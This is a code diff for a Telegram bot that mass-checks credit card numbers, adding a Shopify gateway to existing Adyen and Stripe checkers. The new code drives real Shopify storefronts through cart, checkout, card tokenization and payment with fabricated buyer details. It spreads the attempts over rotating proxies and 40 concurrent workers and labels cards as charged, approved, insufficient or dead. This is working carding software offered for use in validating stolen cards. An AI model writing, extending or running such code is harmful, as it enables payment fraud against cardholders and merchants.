@@ -1,5 +1,5 @@
 # ==============================================================================
-# VIP BOT - ADYEN & STRIPE API CHECK ENGINE v3.0
+# VIP BOT - ADYEN & STRIPE & SHOPIFY API CHECK ENGINE v3.2
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -63,6 +63,13 @@ JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
 JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
 
+# SHOPIFY CONFIG
+SHOPIFY_SITES_FILE = os.getenv("SHOPIFY_SITES_FILE", "sites.txt")
+SHOPIFY_SITES_URL = os.getenv("SHOPIFY_SITES_URL", "")
+SHOPIFY_WORKERS = 40
+SHOPIFY_SEMAPHORE = 50
+SHOPIFY_API_TIMEOUT = 25
+
 def get_valid_target(link, chat_id):
     l = str(link).strip()
     c = str(chat_id).strip()
@@ -86,11 +93,10 @@ GOSPEL_API_URL = "https://gates.valyrian.cc/gospel-piano/check"
 KEYS_FILE = "redeem_keys.json"
 
 # ====================== TIMEOUT & RETRY CONFIG ======================
-API_TIMEOUT = 15  # OPTIMIZED: 15s instead of 60s (dead cards reject fast)
-API_MAX_RETRIES = 3  # OPTIMIZED: 3 retries instead of 8 (faster fail)
-API_RETRY_DELAY = 2.0  # OPTIMIZED: 2s instead of 7s (faster retry)
-
-HIT_DELAY = 0.0  # OPTIMIZED: No delay for instant hit delivery
+API_TIMEOUT = 15
+API_MAX_RETRIES = 3
+API_RETRY_DELAY = 2.0
+HIT_DELAY = 0.0
 
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
@@ -103,6 +109,11 @@ _USER_NAMES = {}
 USER_LAST_REQ = {}
 ACTIVE_MTXT_PROCESSES = {}
 PENDING_FILES = {}
+
+# Shopify sites cache
+_SHOPIFY_SITES = []
+_SHOPIFY_SITES_LOADED = False
+_SHOPIFY_SITES_LOCK = asyncio.Lock()
 
 # ====================== SAFE CHARGED FONT ENGINE ======================
 def sf(text) -> str:
@@ -178,6 +189,7 @@ CE_TOP = '<tg-emoji emoji-id="5415655814079723871">\U0001f51d</tg-emoji>'
 CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">\u2699\ufe0f</tg-emoji>'
 CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">\u2744\ufe0f</tg-emoji>'
 CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">\U0001f4a5</tg-emoji>'
+CE_SHOPIFY = '<tg-emoji emoji-id="5434131838339027877">\U0001f6cd\ufe0f</tg-emoji>'
 
 # ====================== FLAG TRANSLATIONS ======================
 ISO3_TO_ISO2 = {
@@ -437,7 +449,7 @@ _USER_HTTP_SESSIONS = {}
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
-        connector = aiohttp.TCPConnector(limit=50, limit_per_host=30, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=600, use_dns_cache=True, family=0)  # OPTIMIZED: Higher limits + DNS cache
+        connector = aiohttp.TCPConnector(limit=50, limit_per_host=30, ssl=False, enable_cleanup_closed=True, force_close=False, ttl_dns_cache=600, use_dns_cache=True, family=0)
         timeout = aiohttp.ClientTimeout(total=API_TIMEOUT, connect=5)
         _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(connector=connector, timeout=timeout, headers={"Connection": "keep-alive", "Keep-Alive": "timeout=30, max=100"})
     return _USER_HTTP_SESSIONS[key]
@@ -656,6 +668,60 @@ async def get_bin_info(bin_code, session=None):
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "\U0001f310"}
 
 # ==============================================================================
+# SHOPIFY SITES LOADER
+# ==============================================================================
+async def load_shopify_sites():
+    global _SHOPIFY_SITES, _SHOPIFY_SITES_LOADED
+    async with _SHOPIFY_SITES_LOCK:
+        if _SHOPIFY_SITES_LOADED and _SHOPIFY_SITES:
+            return _SHOPIFY_SITES
+
+        sites = []
+
+        # 1. Try local file first (user uploaded)
+        if os.path.exists(SHOPIFY_SITES_FILE):
+            try:
+                async with aiofiles.open(SHOPIFY_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = await f.read()
+                    for line in content.splitlines():
+                        line = line.strip()
+                        if line and not line.startswith('#') and not line.startswith('//'):
+                            # Ensure URL format
+                            if not line.startswith('http'):
+                                line = 'https://' + line
+                            sites.append(line.rstrip('/'))
+                logger.info(f"Loaded {len(sites)} Shopify sites from local file: {SHOPIFY_SITES_FILE}")
+            except Exception as e:
+                logger.error(f"Error loading local sites.txt: {e}")
+
+        # 2. Try URL if set and local failed or empty
+        if not sites and SHOPIFY_SITES_URL:
+            try:
+                async with aiohttp.ClientSession() as s:
+                    async with s.get(SHOPIFY_SITES_URL, timeout=15) as r:
+                        if r.status == 200:
+                            content = await r.text()
+                            for line in content.splitlines():
+                                line = line.strip()
+                                if line and not line.startswith('#') and not line.startswith('//'):
+                                    if not line.startswith('http'):
+                                        line = 'https://' + line
+                                    sites.append(line.rstrip('/'))
+                            logger.info(f"Loaded {len(sites)} Shopify sites from URL")
+            except Exception as e:
+                logger.error(f"Error loading sites from URL: {e}")
+
+        _SHOPIFY_SITES = sites
+        _SHOPIFY_SITES_LOADED = True
+        return sites
+
+async def refresh_shopify_sites():
+    global _SHOPIFY_SITES_LOADED
+    async with _SHOPIFY_SITES_LOCK:
+        _SHOPIFY_SITES_LOADED = False
+    return await load_shopify_sites()
+
+# ==============================================================================
 # ADYEN API ENGINE v3.0 - REAL API CHECK
 # ==============================================================================
 async def check_adyen_api(card, proxy, session):
@@ -713,11 +779,9 @@ async def check_adyen_api(card, proxy, session):
                 clean_refusal = unsf(refusal_reason).lower().strip() if refusal_reason else ""
                 clean_result = unsf(result_code).lower().strip() if result_code else ""
 
-                # CHARGED - Adyen Authorised
                 if clean_result == "authorised" or any(k in clean_rm for k in ['authorised', 'authorized', 'approved', 'success', 'completed']):
                     return {'status': 'Charged', 'message': rm or 'Authorised', 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # INSUFFICIENT FUNDS
                 insufficient_keywords = [
                     'not enough balance', 'insufficient funds', 'insufficient_funds', 'funds',
                     'low balance', 'not enough', 'limit exceeded', 'over limit', 'exceeds', 'nsf',
@@ -726,7 +790,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_refusal in ['not enough balance'] or any(k in clean_rm for k in insufficient_keywords) or any(k in clean_refusal for k in insufficient_keywords):
                     return {'status': 'Insufficient', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # APPROVED - CVV Match / CVC Declined
                 approved_keywords = [
                     'cvc declined', 'cvv match', 'security code', 'invalid_cvv', 'incorrect_cvv',
                     'match', 'avs', 'address verification', 'cvv2', 'cid', 'cvv correct',
@@ -735,7 +798,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_refusal in ['cvc declined'] or any(k in clean_rm for k in approved_keywords) or any(k in clean_refusal for k in approved_keywords):
                     return {'status': 'Approved', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # DEAD - Refused / Cancelled
                 dead_keywords = [
                     'declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
                     'not allowed', 'expired', 'processor_declined', 'card_declined',
@@ -750,7 +812,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_result in ['refused', 'cancelled'] or any(k in clean_rm for k in dead_keywords) or any(k in clean_refusal for k in dead_keywords):
                     return {'status': 'Dead', 'message': refusal_reason or rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
 
-                # SITE ERROR
                 site_error_keywords = [
                     'error', 'timeout', 'connection', 'unreachable', 'not found',
                     'acquirer error', 'issuer unavailable', 'system error',
@@ -759,7 +820,6 @@ async def check_adyen_api(card, proxy, session):
                 if clean_result == "error" or any(k in clean_rm for k in site_error_keywords) or any(k in clean_refusal for k in site_error_keywords):
                     return {'status': 'Site Error', 'message': refusal_reason or rm, 'card': card}
 
-                # Unknown = Dead
                 if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
                     return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Adyen', 'price': price or '-'}
@@ -844,23 +904,19 @@ async def check_stripe_api(card, proxy, session):
                 clean_code = stripe_code if stripe_code else ""
                 clean_decline = stripe_decline if stripe_decline else ""
 
-                # CHARGED - Stripe succeeded
                 if stripe_status == "succeeded" or any(k in clean_rm for k in ['succeeded', 'success', 'charged', 'payment succeeded', 'completed']):
                     return {'status': 'Charged', 'message': rm or 'Payment Succeeded', 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # INSUFFICIENT FUNDS
                 insufficient_codes = ['insufficient_funds', 'insufficient funds', 'balance_insufficient']
                 insufficient_keywords = ['insufficient funds', 'insufficient_funds', 'funds', 'low balance', 'not enough', 'nsf']
                 if clean_code in insufficient_codes or any(k in clean_rm for k in insufficient_keywords) or any(k in clean_decline for k in insufficient_keywords):
                     return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # APPROVED - CVV issues
                 approved_codes = ['incorrect_cvc', 'incorrect_cvv', 'invalid_cvc', 'incorrect_zip', 'incorrect_address']
                 approved_keywords = ['cvc', 'cvv', 'security code', 'incorrect cvc', 'incorrect cvv', 'zip code', 'postal code']
                 if clean_code in approved_codes or any(k in clean_rm for k in approved_keywords):
                     return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # DEAD
                 dead_codes = [
                     'card_declined', 'expired_card', 'incorrect_number', 'invalid_number',
                     'invalid_expiry_month', 'invalid_expiry_year', 'invalid_cvc', 'authentication_required',
@@ -877,13 +933,11 @@ async def check_stripe_api(card, proxy, session):
                 if clean_code in dead_codes or any(k in clean_rm for k in dead_keywords) or any(k in clean_decline for k in dead_keywords):
                     return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
 
-                # SITE ERROR
                 site_error_codes = ['processing_error', 'issuer_not_available', 'try_again_later', 'api_error']
                 site_error_keywords = ['error', 'timeout', 'connection', 'unreachable', 'not found', 'service unavailable']
                 if clean_code in site_error_codes or any(k in clean_rm for k in site_error_keywords):
                     return {'status': 'Site Error', 'message': rm, 'card': card}
 
-                # Unknown = Dead
                 if len(clean_rm) < 5 or clean_rm in ['ok', 'done', 'yes', 'true']:
                     return {'status': 'Dead', 'message': rm or 'Unknown Response', 'card': card, 'gateway': 'Stripe $1', 'price': price}
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Stripe $1', 'price': price}
@@ -910,16 +964,298 @@ async def check_stripe_api(card, proxy, session):
     return {'status': 'Site Error', 'message': last_error or 'Unknown Error', 'card': card}
 
 # ==============================================================================
-# REAL PROXY CHECKER ENGINE v3.1 - OPTIMIZED (Fixed False Dead Detection)
+# SHOPIFY API ENGINE v3.2 - REAL SHOPIFY CHECKOUT CHECK
 # ==============================================================================
-# المشكلة كانت: يفحص البروكسي ببطاقة اختبار والـ API يرفضها فيحذف البروكسي الشغال
-# الحل: نفحص الاتصال فقط عبر ipify مع retry، بدون فحص البطاقة
+async def check_shopify_api(card, proxy, session, site_url):
+    """
+    Real Shopify checkout check using store's payment flow.
+    Returns real responses from Shopify: Charged, Approved, Insufficient, Dead, Site Error
+    """
+    proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else (proxy if proxy else None)
+
+    try:
+        cc, mm, yy, cvv = card.split("|")
+        mm = str(int(mm)).zfill(2)
+        yy_full = f"20{yy}" if len(yy) == 2 else yy
+    except Exception:
+        return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+
+    site = site_url.strip().rstrip("/")
+    if not site.startswith("http"):
+        site = "https://" + site
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "DNT": "1",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Cache-Control": "max-age=0"
+    }
+
+    variant_id = None
+    product_price = "1.00"
+    auth_token = None
+    checkout_url = None
+
+    try:
+        # Step 1: Get product from store
+        async with session.get(f"{site}/products.json?limit=5", proxy=proxy_url, headers=headers, timeout=10, ssl=False) as resp:
+            if resp.status != 200:
+                return {'status': 'Site Error', 'message': f'Store Offline ({resp.status})', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+            try:
+                data = await resp.json()
+                products = data.get("products", [])
+            except Exception:
+                return {'status': 'Site Error', 'message': 'Invalid Store Response', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+
+            if not products:
+                return {'status': 'Site Error', 'message': 'No Products Available', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+
+            # Find first available variant with inventory
+            for p in products:
+                variants = p.get("variants", [])
+                for v in variants:
+                    if v.get("available", True) and v.get("id"):
+                        variant_id = v["id"]
+                        product_price = v.get("price", "1.00")
+                        break
+                if variant_id:
+                    break
+
+            if not variant_id:
+                # Fallback to first variant
+                variant_id = products[0]["variants"][0]["id"]
+                product_price = products[0]["variants"][0].get("price", "1.00")
+
+        # Step 2: Add to cart
+        cart_headers = {
+            **headers,
+            "Content-Type": "application/json",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": site,
+            "Referer": f"{site}/"
+        }
+        cart_data = {"id": variant_id, "quantity": 1, "form_type": "product"}
+
+        async with session.post(f"{site}/cart/add.js", json=cart_data, proxy=proxy_url, headers=cart_headers, timeout=10, ssl=False) as resp:
+            if resp.status not in [200, 302]:
+                return {'status': 'Site Error', 'message': f'Cart Failed ({resp.status})', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+        # Step 3: Initiate checkout
+        checkout_headers = {
+            **headers,
+            "Referer": f"{site}/cart"
+        }
+        async with session.get(f"{site}/checkout", proxy=proxy_url, headers=checkout_headers, timeout=15, ssl=False, allow_redirects=True) as resp:
+            checkout_html = await resp.text()
+            checkout_url = str(resp.url).rstrip("/")
+
+            # Extract authenticity token
+            auth_match = re.search(r'name="authenticity_token" value="([^"]+)"', checkout_html)
+            if not auth_match:
+                auth_match = re.search(r'"authenticity_token":"([^"]+)"', checkout_html)
+            if not auth_match:
+                auth_match = re.search(r'data-authenticity-token="([^"]+)"', checkout_html)
+
+            if not auth_match:
+                return {'status': 'Site Error', 'message': 'No Auth Token', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            auth_token = auth_match.group(1)
+
+        # Step 4: Submit contact information
+        contact_headers = {
+            **headers,
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": site,
+            "Referer": f"{checkout_url}?step=contact_information"
+        }
+
+        contact_data = {
+            "_method": "patch",
+            "authenticity_token": auth_token,
+            "previous_step": "contact_information",
+            "step": "shipping_method",
+            "checkout[email]": "testuser@protonmail.com",
+            "checkout[buyer_accepts_marketing]": "0",
+            "checkout[shipping_address][first_name]": "Alex",
+            "checkout[shipping_address][last_name]": "Smith",
+            "checkout[shipping_address][address1]": "123 Main Street",
+            "checkout[shipping_address][address2]": "",
+            "checkout[shipping_address][city]": "New York",
+            "checkout[shipping_address][country]": "United States",
+            "checkout[shipping_address][province]": "New York",
+            "checkout[shipping_address][zip]": "10001",
+            "checkout[shipping_address][phone]": "+15551234567"
+        }
+
+        async with session.post(checkout_url, data=contact_data, proxy=proxy_url, headers=contact_headers, timeout=15, ssl=False, allow_redirects=True) as resp:
+            shipping_html = await resp.text()
+
+        # Step 5: Get shipping rate
+        shipping_rate_match = re.search(r'name="checkout\[shipping_rate\]\[id\]" value="([^"]+)"', shipping_html)
+        if not shipping_rate_match:
+            shipping_rate_match = re.search(r'data-shipping-method="([^"]+)"', shipping_html)
+        if not shipping_rate_match:
+            shipping_rate_match = re.search(r'"shippingRateId":"([^"]+)"', shipping_html)
+
+        shipping_rate_id = shipping_rate_match.group(1) if shipping_rate_match else ""
+
+        # Step 6: Submit shipping
+        shipping_data = {
+            "_method": "patch",
+            "authenticity_token": auth_token,
+            "previous_step": "shipping_method",
+            "step": "payment_method",
+            "checkout[shipping_rate][id]": shipping_rate_id
+        }
+
+        async with session.post(checkout_url, data=shipping_data, proxy=proxy_url, headers=contact_headers, timeout=15, ssl=False, allow_redirects=True) as resp:
+            payment_html = await resp.text()
+
+        # Step 7: Tokenize card via Shopify Card Vault
+        vault_url = "https://deposit.us.shopifycs.com/sessions"
+        vault_payload = {
+            "credit_card": {
+                "number": cc,
+                "first_name": "Alex",
+                "last_name": "Smith",
+                "month": mm,
+                "year": yy_full,
+                "verification_value": cvv
+            }
+        }
+
+        vault_headers = {
+            "User-Agent": headers["User-Agent"],
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Origin": site,
+            "Referer": f"{checkout_url}/payment"
+        }
+
+        async with session.post(vault_url, json=vault_payload, proxy=proxy_url, headers=vault_headers, timeout=15, ssl=False) as resp:
+            try:
+                vault_data = await resp.json()
+            except Exception:
+                vault_text = await resp.text()
+                return {'status': 'Site Error', 'message': f'Vault Parse Error', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            if resp.status != 200 or "id" not in vault_data:
+                error_msg = str(vault_data.get("errors", vault_data.get("error", "Unknown"))).lower()
+
+                if any(k in error_msg for k in ["invalid", "decline", "incorrect", "unacceptable", "rejected"]):
+                    return {'status': 'Dead', 'message': 'Card Declined (Vault)', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+                return {'status': 'Site Error', 'message': f'Vault Error: {error_msg[:40]}', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            vault_token = vault_data["id"]
+
+        # Step 8: Submit payment
+        # Try to detect payment gateway from page
+        gateway_match = re.search(r'name="checkout\[payment_gateway\]" value="(\d+)"', payment_html)
+        if not gateway_match:
+            gateway_match = re.search(r'"paymentGateway":(\d+)', payment_html)
+
+        gateway_id = gateway_match.group(1) if gateway_match else "shopify_payments"
+
+        payment_data = {
+            "_method": "patch",
+            "authenticity_token": auth_token,
+            "previous_step": "payment_method",
+            "step": "",
+            "checkout[payment_gateway]": gateway_id,
+            "checkout[credit_card][vault_token]": vault_token,
+            "checkout[different_billing_address]": "false",
+            "checkout[remember_me]": "0",
+            "checkout[total_price]": product_price
+        }
+
+        async with session.post(checkout_url, data=payment_data, proxy=proxy_url, headers=contact_headers, timeout=25, ssl=False, allow_redirects=True) as resp:
+            result_html = await resp.text()
+            final_url = str(resp.url)
+            result_lower = result_html.lower()
+
+            # Analyze Shopify real responses
+            # CHARGED - Payment succeeded
+            if "thank_you" in final_url or "/orders/" in final_url or "processing" in final_url:
+                return {'status': 'Charged', 'message': 'Payment Successful', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            if "payment succeeded" in result_lower or "success" in result_lower and "error" not in result_lower:
+                return {'status': 'Charged', 'message': 'Payment Successful', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            # INSUFFICIENT FUNDS
+            insufficient_patterns = [
+                'insufficient funds', 'not enough balance', 'insufficient_funds',
+                'low balance', 'not enough', 'nsf', 'withdrawal amount exceeded',
+                'funds', 'balance_insufficient', 'not_enough_funds'
+            ]
+            if any(p in result_lower for p in insufficient_patterns):
+                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            # APPROVED - CVV/AVS issues (card valid but needs verification)
+            approved_patterns = [
+                'cvc', 'cvv', 'security code', 'incorrect cvc', 'incorrect cvv',
+                'zip code', 'postal code', 'avs', 'address verification',
+                'cvv2', 'cid', 'cvv match', 'cvc declined', 'cvv declined'
+            ]
+            if any(p in result_lower for p in approved_patterns):
+                return {'status': 'Approved', 'message': 'CVV/AVS Check', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            # DEAD - Card declined
+            dead_patterns = [
+                'declined', 'do not honor', 'pick up card', 'stolen', 'lost', 'fraud',
+                'not allowed', 'expired', 'invalid account', 'invalid number',
+                'call issuer', 'authentication required', '3d secure', 'otp required',
+                'challenge', 'incorrect', 'wrong', 'denied', 'rejected', 'blocked',
+                'banned', 'unauthorized', 'forbidden', 'invalid card', 'card error',
+                'payment failed', 'transaction declined', 'issuer declined',
+                'not_permitted', 'restricted', 'not supported'
+            ]
+            if any(p in result_lower for p in dead_patterns):
+                # Extract specific error message
+                error_match = re.search(r'class="field__message field__message--error"[^>]*>([^<]+)', result_html)
+                if not error_match:
+                    error_match = re.search(r'"notice__text">([^<]+)', result_html)
+                if not error_match:
+                    error_match = re.search(r'"errors":\["([^"]+)"\]', result_html)
+
+                error_msg = error_match.group(1).strip() if error_match else 'Card Declined'
+                return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            # Check for specific Shopify error notices
+            notice_match = re.search(r'class="notice__text"[^>]*>([^<]+)', result_html)
+            if notice_match:
+                notice_msg = notice_match.group(1).strip().lower()
+                if any(p in notice_msg for p in dead_patterns):
+                    return {'status': 'Dead', 'message': notice_match.group(1).strip(), 'card': card, 'gateway': 'Shopify', 'price': product_price}
+                if any(p in notice_msg for p in insufficient_patterns):
+                    return {'status': 'Insufficient', 'message': notice_match.group(1).strip(), 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+            # Default to Dead if we reached here without success
+            return {'status': 'Dead', 'message': 'Payment Failed', 'card': card, 'gateway': 'Shopify', 'price': product_price}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'Shopify Timeout', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+    except aiohttp.ClientError as e:
+        return {'status': 'Site Error', 'message': f'Connection Error: {str(e)[:30]}', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+    except Exception as e:
+        return {'status': 'Site Error', 'message': f'Shopify Error: {str(e)[:30]}', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+
+# ==============================================================================
+# REAL PROXY CHECKER ENGINE v3.1 - OPTIMIZED
+# ==============================================================================
 async def check_proxy_real(proxy_dict, session, timeout=15):
     proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
     if not proxy_url:
         return False, "No proxy URL"
 
-    # Test 1: IP Connectivity with retry (3 attempts)
     for attempt in range(3):
         try:
             test_headers = {"User-Agent": "Mozilla/5.0"}
@@ -932,7 +1268,6 @@ async def check_proxy_real(proxy_dict, session, timeout=15):
                     except:
                         return True, "Working (IP check passed)"
                 elif r.status in [403, 407, 429]:
-                    # Proxy auth issues or rate limit - still alive but has issues
                     return True, f"Working but limited ({r.status})"
         except asyncio.TimeoutError:
             if attempt < 2:
@@ -948,7 +1283,7 @@ async def check_proxy_real(proxy_dict, session, timeout=15):
     return False, "IP Check Failed after retries"
 
 # ==============================================================================
-# REAL CHECK CARD ENGINE - API ONLY (No Workers, No Sites)
+# REAL CHECK CARD ENGINE - API ONLY
 # ==============================================================================
 async def check_card_real(card, proxies, session, gateway_name, uid):
     p_dict = random.choice(proxies) if proxies else None
@@ -959,6 +1294,12 @@ async def check_card_real(card, proxies, session, gateway_name, uid):
             res = await check_adyen_api(card, p_url, session)
         elif gateway_name == "Stripe $1":
             res = await check_stripe_api(card, p_url, session)
+        elif gateway_name == "Shopify":
+            sites = await load_shopify_sites()
+            if not sites:
+                return {'status': 'Site Error', 'message': 'No Shopify sites loaded. Upload sites.txt', 'card': card, 'gateway': 'Shopify', 'price': '-'}
+            site = random.choice(sites)
+            res = await check_shopify_api(card, p_url, session, site)
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
 
@@ -970,8 +1311,13 @@ async def check_card_real(card, proxies, session, gateway_name, uid):
                 p_url2 = p_dict2['proxy_url'] if p_dict2 else None
                 if gateway_name == "Adyen":
                     res = await check_adyen_api(card, p_url2, session)
-                else:
+                elif gateway_name == "Stripe $1":
                     res = await check_stripe_api(card, p_url2, session)
+                elif gateway_name == "Shopify":
+                    sites = await load_shopify_sites()
+                    if sites:
+                        site2 = random.choice(sites)
+                        res = await check_shopify_api(card, p_url2, session, site2)
                 status = res.get('status')
 
         if status == 'Site Error':
@@ -1048,6 +1394,7 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         kb = [
             [InlineKeyboardButton('Adyen (Triumph)', callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
             [InlineKeyboardButton('Stripe $1 Charge', callback_data="gate:Stripe $1", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('Shopify Real Check', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5434131838339027877")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
@@ -1153,7 +1500,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(proxies) > 30: t += f"\n<i>+{sf(str(len(proxies)-30))} {sf('more...')}</i>"
             await styled_reply(update, t, use_gif=True)
 
-        # REAL /checkpxy COMMAND
         elif cmd == "checkpxy":
             if not await force_join_check(update, context): return
             now = time.time()
@@ -1184,12 +1530,12 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             async with aiohttp.ClientSession(connector=connector) as test_session:
                 async def test_single_proxy(idx, p_dict):
                     nonlocal working_count
-                    is_working, msg = await check_proxy_real(p_dict, test_session, timeout=10)  # OPTIMIZED: 10s timeout
+                    is_working, msg = await check_proxy_real(p_dict, test_session, timeout=10)
                     if not is_working:
                         dead_proxies.append((idx, p_dict, msg))
                     else:
                         working_count += 1
-                semaphore = asyncio.Semaphore(20)  # OPTIMIZED: 20 concurrent proxy checks
+                semaphore = asyncio.Semaphore(20)
                 async def bounded_test(idx, p_dict):
                     async with semaphore:
                         await test_single_proxy(idx, p_dict)
@@ -1344,6 +1690,18 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
             except Exception: pass
 
+        elif cmd == "shopsites":
+            if uid not in ADMIN_ID: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
+            sites = await refresh_shopify_sites()
+            if not sites:
+                return await styled_reply(update, f"<b>{CE_CLOWN} {sf('No Shopify sites loaded. Upload sites.txt file.')}</b>", use_gif=True)
+            t = f"<b>{CE_SHOPIFY} {sf('Shopify Sites Loaded')}:</b> <code>{len(sites)}</code>\n\n"
+            for i, s in enumerate(sites[:20], 1):
+                t += f"<code>{i}.</code> <code>{sf(s)}</code>\n"
+            if len(sites) > 20:
+                t += f"\n<i>+{len(sites)-20} more...</i>"
+            await styled_reply(update, t, use_gif=True)
+
         else:
             await styled_reply(update, f"<b>{CE_THINK1} {sf('Unknown Command!')}</b>\n\n╰ {sf('Type /start to see available commands.')}", use_gif=True)
 
@@ -1449,7 +1807,7 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_FLASH} {sf('API Timeout')}:</b> <code>{sf(str(API_TIMEOUT))}s</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
-# ====================== REAL MASS PROCESSOR - API ONLY (No Workers) ======================
+# ====================== REAL MASS PROCESSOR - API ONLY ======================
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards)
@@ -1460,16 +1818,32 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     http_session = await get_user_http_session(uid)
     last_resp = sf("Waiting for response...")
 
+    # Shopify specific: load sites and use 40 workers
+    is_shopify = (gate_name == "Shopify")
+    if is_shopify:
+        sites = await load_shopify_sites()
+        if not sites:
+            try:
+                await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('No Shopify sites loaded!')}</b>\n\n╰ {sf('Please upload sites.txt or set SHOPIFY_SITES_URL.')}")
+            except: pass
+            process_store.pop(uid, None)
+            await cleanup_user_http_session(uid)
+            return
+        workers_count = SHOPIFY_WORKERS
+        sem_count = SHOPIFY_SEMAPHORE
+    else:
+        workers_count = 10
+        sem_count = 25
+
     def is_stopped():
         return process_store.get(uid, {}).get("stopped", False)
 
     hit_tasks = []
-    # Semaphore for API-only checking (no workers system)
